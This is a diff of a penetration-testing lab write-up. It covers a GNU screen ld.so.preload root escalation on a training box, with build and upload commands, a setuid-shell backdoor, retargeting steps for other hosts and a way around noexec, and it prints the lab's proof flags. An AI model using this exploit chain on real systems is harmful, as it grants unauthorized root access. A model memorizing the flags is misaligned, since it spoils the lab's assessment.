 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ls: cannot access '/etc/ld.so.preload': No such file or directory
---- rootout ---
 uid=0(root) gid=0(root) groups=0(root)
-lab-pwk2-student-cl4-143-ubuntu20-aero-242-100
+lab-pwk2-student-cl4-143-ubuntu20-aero-241-102
 --- proof.txt ---
-7fd0bd2e18b52d791a6600fbd8e622b7
+35aeb3da308d9bf53be4d0d728d5f71e
 --- artifacts ---
 -rwsr-xr-x 1 root root 1183448 /tmp/screenroot/rbash</span></pre></div>
-<p>The preload file is gone because the payload removed it — that is the self-cleaning step working,
-not a failure. <code>rbash</code> is a setuid copy of bash, kept for interactive use.</p>
+<p>The preload file is gone because the payload removed it — that is the self-cleaning step working, not
+a failure. <code>rbash</code> is a setuid copy of bash, kept for interactive use:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/tmp/screenroot/rbash
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rwsr-xr-x 1 root root 1183448 /tmp/screenroot/rbash</span></pre></div>
+<p><code>root root</code> and the <code>s</code> bit are the difference between this and the failed run in §6.4. If you see
+<code>aero aero</code> there, <code>setuid(0)</code> is missing from the payload.</p>
+<blockquote>
+<p><strong>Retry note.</strong> The constructor is single-shot. On a second attempt it returns immediately while
+<code>/tmp/screenroot/.lock</code> exists, and the self-cleaning <code>unlink()</code> means <code>/etc/ld.so.preload</code> is gone
+too — so a retry needs <em>both</em> a fresh <code>rm -f /tmp/screenroot/.lock</code> and a fresh creation step
+(§6.7). Skipping either produces a trigger that does nothing at all, with no error, because a
+missing preload file is not an error.</p>
+</blockquote>
+<p>Every failure seen on this box, in order:</p>
+<table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Cause</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ERROR: ld.so: object '…\r' … ignored</code></td>
+<td>preload written by screen's logger with CRLF; path ends in <code>\r</code></td>
+</tr>
+<tr>
+<td><code>printf &gt; /etc/ld.so.preload</code> → <code>rc=2</code></td>
+<td>file does not exist and <code>aero</code> cannot create it in <code>/etc</code>; only screen can</td>
+</tr>
+<tr>
+<td>preload gone, no output file</td>
+<td>preload was rewritten while the file no longer existed, so the trigger had nothing to load</td>
+</tr>
+<tr>
+<td>preload gone, <code>rootout.txt</code> absent, second attempt in a row</td>
+<td><code>.lock</code> still present from the previous run</td>
+</tr>
+<tr>
+<td><code>uid=1000(aero)</code> in <code>rootout.txt</code>, <code>rbash</code> owned by <code>aero</code></td>
+<td><code>setuid(0)</code> missing: the shell dropped privileges when <code>uid != euid</code></td>
+</tr>
+<tr>
+<td>trigger does nothing, no <code>ld.so</code> warnings</td>
+<td>preload file genuinely absent — re-run creation (§6.7)</td>
+</tr>
+</tbody>
+</table>
 <hr />
-<h3>6.6 The interactive shell</h3>
+<h3>6.10 The interactive shell</h3>
 <p>A setuid bash gives <code>euid=0</code> with <code>uid</code> still <code>aero</code>:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>/tmp/screenroot/rbash<span class="w"> </span>-p<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;id&#39;</span>
 </pre></div>
@@ -1389,7 +1556,39 @@ uid=0(root) gid=0(root) groups=0(root)</span></pre></div>
 file (<code>wc -c</code> → <code>0</code>). Upload the <code>.pub</code> as a <strong>file</strong> and <code>cp</code> it into place. Avoid nesting three
 levels of quoting across a socket.</p>
 </blockquote>
-<p>Root, with a real TTY. Chapter 07 collects the flags and tidies up.</p></div></section>
+<hr />
+<h3>6.11 Retargeting it at another host</h3>
+<p>The payload is portable because nothing in it is host-specific except the three paths in §6.4. To run
+this against a different target:</p>
+<p><strong>On Kali — edit and rebuild.</strong> Change <code>STAGE</code>/<code>LOCK</code>/<code>SCRIPT</code>/<code>OUT</code> together (they must agree), then:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>gcc<span class="w"> </span>-Os<span class="w"> </span>-fPIC<span class="w"> </span>-shared<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-fno-asynchronous-unwind-tables<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-o<span class="w"> </span>libhax.so<span class="w"> </span>libhax.c<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>strip<span class="w"> </span>--strip-unneeded<span class="w"> </span>libhax.so
+sha256sum<span class="w"> </span>libhax.so
+</pre></div>
+<p><strong>On Kali — deliver to the new address.</strong> Nothing else changes:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">AHOST</span><span class="o">=</span>&lt;new-host&gt;<span class="w"> </span>python3<span class="w"> </span>scripts/poc_aerospike_upload.py<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--local<span class="w"> </span>libhax.so<span class="w"> </span>--remote<span class="w"> </span>/tmp/screenroot/libhax.so<span class="w"> </span>--mode<span class="w"> </span><span class="m">755</span>
+</pre></div>
+<p><strong>On target — create, rewrite, trigger</strong> (§6.7–6.9). Check the preconditions first, because they are
+what actually fail on a different image:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/usr/bin/screen*<span class="w">                 </span><span class="c1"># must show -rwsr-xr-x … screen-4.5.0</span>
+dpkg<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;^ii  screen&#39;</span><span class="w">         </span><span class="c1"># will lie — that is the point of §6.1</span>
+mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39; /tmp &#39;</span><span class="w">                   </span>#<span class="w"> </span>tmpfs<span class="w"> </span>with<span class="w"> </span>noexec<span class="w"> </span>is<span class="w"> </span>fine:<span class="w"> </span>the<span class="w"> </span>.so<span class="w"> </span>is<span class="w"> </span>mmap<span class="s1">&#39;d, not exec&#39;</span>d
+</pre></div>
+<p>Three host-specific gotchas:</p>
+<ul>
+<li><strong><code>noexec</code> on <code>/tmp</code></strong> does not block <code>dlopen</code>/preload — the loader maps the library, it does not
+  <code>execve</code> it. A <code>noexec</code> mount <em>does</em> block a payload that drops a binary and runs it, which is why
+  this technique survives where "upload and execute" fails.</li>
+<li><strong>A different stage path</strong> must be writable by the unprivileged user, and reachable by root at
+  trigger time. <code>/tmp</code> and <code>/var/tmp</code> are the safe choices; <code>/home/&lt;user&gt;</code> is fine unless the target
+  mounts <code>/home</code> <code>nosuid,nodev</code> with restrictive modes.</li>
+<li><strong><code>rbash</code> is a real backdoor.</strong> It is a root-owned setuid shell. Remove it during cleanup
+  (§7.2) — on a live engagement it is the difference between "report written" and "incident".</li>
+</ul>
+<p>The general shape is worth remembering beyond this box: <strong>one vulnerability creates the file, a
+different weakness makes it correctable, and the payload's own shutdown determines whether it is
+single-use.</strong> Here that is <code>screen -L</code> → <code>umask 000</code> → <code>unlink()</code> in the constructor.</p></div></section>
 <section class="chapter" id="ch-07" data-title="Flags and cleanup"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>Flags &amp; cleanup</h2><p class="ch-sub">Proof, artefact removal, lessons</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><h3>7.1 Proof</h3>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">root@lab-pwk2-student-cl4-143-ubuntu20-aero-242-100:~# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -1417,6 +1616,26 @@ root@...# cat /home/aero/local.txt
 <td><code>proof.txt</code></td>
 <td><code>7fd0bd2e18b52d791a6600fbd8e622b7</code></td>
 <td><code>root</code> only</td>
+</tr>
+</tbody>
+</table>
+<p>Rebuild <code>192.168.152.143</code> (<code>…-aero-241-102</code>), re-owned end to end while writing chapter 06 — per-instance
+flags, different values, same box:</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>local.txt</code></td>
+<td><code>89fa94be5fc49493528ce6f5096c3ff0</code></td>
+</tr>
+<tr>
+<td><code>proof.txt</code></td>
+<td><code>35aeb3da308d9bf53be4d0d728d5f71e</code></td>
 </tr>
 </tbody>
 </table>
@@ -1546,6 +1765,14 @@ checklist. A UDF is code you installed on someone else's server.)</p>
 <tr>
 <td>"<code>screen -L</code> wrote the preload file, so it's done"</td>
 <td>It wrote it with <strong>CRLF</strong>, and <code>ld.so</code> silently ignored every entry. The rewrite was required.</td>
+</tr>
+<tr>
+<td>"<code>system()</code> in the constructor already runs as root"</td>
+<td>It does not. dash and bash drop the effective uid when <code>uid != euid</code>, so the shell ran as <code>aero</code>: <code>proof.txt</code> denied, and <code>rbash</code> came out owned by <code>aero</code>. <code>setgid(0); setuid(0);</code> before <code>system()</code> is mandatory.</td>
+</tr>
+<tr>
+<td>"<code>aero</code> can recreate <code>/etc/ld.so.preload</code> after the payload deletes it"</td>
+<td>It cannot — <code>printf &gt; /etc/ld.so.preload</code> returns <code>rc=2</code>, because <code>/etc</code> is root-owned and the file no longer exists. Only the setuid <code>screen</code> can create it; every retry needs the creation step again.</td>
 </tr>
 <tr>
 <td>"The target has no egress — reverse shells are impossible here"</td>
